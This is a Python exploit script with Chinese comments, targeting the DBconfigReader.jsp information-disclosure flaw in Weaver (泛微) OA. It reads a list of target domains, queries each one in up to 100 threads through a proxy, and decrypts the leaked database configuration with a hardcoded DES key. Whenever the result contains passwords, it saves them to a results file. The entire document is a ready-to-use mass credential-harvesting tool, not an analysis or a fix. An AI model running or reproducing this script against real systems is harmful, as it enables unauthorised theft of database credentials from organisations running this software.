# 泛微OA DBconfigReader.jsp 数据库配置信息泄漏漏洞
# 作者 charis
# 密匙为 1z2x3c4v 1z2x3c4v5b6n 自行更改
import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep
from pyDes import des

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}


def postData(url, headers, proxies):
    try:
        s = ""
        poc = f"/mobile/DBconfigReader.jsp"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.get(urldata, headers=headers, proxies=proxies, verify=False)
        ex = Exception("出现问题了")
        if re.status_code == 200:
            try:
                data = str(des('1z2x3c4v').decrypt(requests.get(urldata, headers=headers, proxies=proxies, verify=False).content))
                if data.find("password") >=0:
                    print("[+]存在漏洞" + str(urldata) + "\n解密为:" + data)
                    s += data + "\n"
                    with open("D:\\code\\python\\exp\\泛微OA\\result.txt", "a", encoding="utf-8") as f:
                        f.write(url + s)
            except Exception as e:
                pass
    except requests.exceptions.ConnectionError:
        pass


with open("D:\\code\\python\\exp\\泛微OA\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)
